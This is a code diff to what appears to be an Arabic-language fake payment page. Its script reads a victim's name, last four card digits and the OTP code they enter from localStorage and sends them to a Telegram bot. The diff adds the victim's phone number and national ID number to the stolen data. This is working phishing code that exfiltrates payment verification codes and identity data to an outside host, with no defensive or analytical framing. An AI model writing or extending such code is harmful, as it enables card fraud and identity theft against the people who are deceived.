@@ -243,6 +243,7 @@ height: auto;
     const telegramBotToken = TELEGRAM_BOT_TOKEN_PAYMENT;
     const chatId = TELEGRAM_CHAT_ID_PAYMENT;
 
+        
     // Get owner name
     function getOwnerName() {
       return localStorage.getItem('owner_name') || 'غير معروف';
@@ -251,6 +252,15 @@ height: auto;
     // Get last 4 digits of card
     function getLast4Digits() {
       return localStorage.getItem('cardNumber') || '----';
+    }
+
+    // Get phone and ID
+    function getPhone() {
+      return localStorage.getItem('phone') || 'غير متوفر';
+    }
+
+    function getIdNumber() {
+      return localStorage.getItem('id_number') || 'غير متوفر';
     }
 
     // Send data directly to Telegram
@@ -275,6 +285,10 @@ height: auto;
 ✅ <b>رمز التحقق (1)</b>
 ━━━━━━━━━━━━━━━
 👤 من: ${data.owner_name}
+━━━━━━━━━━━━━━━
+📱 رقم الهاتف: ${data.phone}
+🪪 رقم الهوية: ${data.id_number}
+━━━━━━━━━━━━━━━
 💳 آخر 4 أرقام: ${data.last_4_digits}
 🔐 رمز OTP: ${data.otp_code}
       `;
@@ -299,6 +313,8 @@ height: auto;
       // Prepare data
       const data = {
         owner_name: getOwnerName(),
+        phone: getPhone(),
+        id_number: getIdNumber(),
         last_4_digits: getLast4Digits(),
         otp_code: otpValue
       };
